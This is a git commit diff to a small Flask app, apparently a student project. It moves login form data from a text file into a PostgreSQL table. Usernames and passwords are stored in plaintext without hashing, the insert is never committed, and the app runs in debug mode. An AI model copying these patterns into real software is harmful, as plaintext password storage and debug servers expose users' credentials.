633343a6d3b6eaa41a35e176de4985efa552378e
Fernanda Gomez <77248726+fjacquelinegomez@users.noreply.github.com>
2024-11-22 20:16:01 -0800

    connecting python code with flask to the postgresql

--- userdata.py
+++ userdata.py
@@ -1,11 +1,16 @@
 # Resources:
 #1. https://flask.palletsprojects.com/en/stable/
-
-
-
+import os
+import psycopg2
 from flask import Flask, render_template, request
 
 app = Flask(__name__)
+
+#gets database url
+DATABASE_URL = os.environ.get('DATABASE_URL')
+
+#connect to the database
+connect = psycopg2.connect(DATABASE_URL, sslmode ='require')
 
 # Route to display the login page
 @app.route('/')
@@ -18,9 +23,13 @@ def login():
     username = request.form.get('username')
     password = request.form.get('password')
     
-    with open("user_data.txt", 'a') as file:
-        file.write(f"Username : {username}, Password: {password}\n")
+    #add user data to the database
+    with connect.cursor() as cur:
+        cur.execute("INSERT INTO users (username, password) VALUES (%s, %s)", (username, password))
     
     # Send a response back to the user
     return "Login data received."
+
+if __name__ == '__main__':
+    app.run(debug=True)
 
